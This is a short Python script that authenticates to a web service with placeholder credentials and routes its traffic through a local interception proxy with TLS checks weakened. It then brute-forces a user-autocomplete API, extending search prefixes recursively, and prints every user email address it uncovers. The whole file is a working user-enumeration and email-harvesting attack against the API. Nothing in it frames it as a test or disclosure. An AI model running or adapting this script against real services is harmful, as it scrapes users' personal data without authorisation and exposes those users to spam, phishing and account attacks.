#!/usr/bin/python3
import http.cookiejar
import urllib.request
import urllib.parse
import ssl
import json
import string

# deactivate TLS cert warnings
tls_warnings = False

# variables
username            = "foo"
password            = "bar"

auth_url            = 'https://udp.foo.de/authenticate'
autocomplete_url    = 'https://udp.foo.de/api/1/user/autocomplete?query='

post_values         = {'username':username,
                       'password':password}

# for mitmproxy because of the missing/changed root ca
gcontext = ssl.SSLContext(ssl.PROTOCOL_TLSv1)

def construct_opener():
    # structure to handle cookies
    cookies = http.cookiejar.CookieJar()

    # build opener
    req_build = urllib.request.build_opener(
        urllib.request.ProxyHandler({'https': '127.0.0.1:8080'}),
        urllib.request.HTTPRedirectHandler(),
        urllib.request.HTTPHandler(debuglevel=0),
        urllib.request.HTTPSHandler(debuglevel=0, context=gcontext),
        urllib.request.HTTPCookieProcessor(cookies))

    # add user agent
    req_build.addheaders = [
        ('User-agent', ('Mozilla/4.0 (compatible; MSIE 6.0; '
                        'Windows NT 5.2; .NET CLR 1.1.4322)')) ]
    return req_build

def authenticate(req_opener,url,post_values):
    # encode POST values
    data = urllib.parse.urlencode(post_values)
    data = data.encode('ascii')

    # send authentication request
    auth = req_opener.open(url,data)

def construct_query(req_opener,url):
    alpha_num = list(string.ascii_lowercase)
    add_alpha = ['.','_','-','+']
    alpha_num.extend(add_alpha)

    for i in alpha_num:
        new_url = url + i
        json_data = json.loads(query_url(req_opener,new_url))

        if len(json_data) >= 5:
            construct_query(req_opener,new_url)
        else:
            for data in json_data:
                print(data['email'])

def query_url(req_opener,url):
    query = req_opener.open(url)
    query_result = query.read().decode('utf-8')

    return query_result


opener = construct_opener()
authenticate(opener,auth_url,post_values)
construct_query(opener,autocomplete_url)

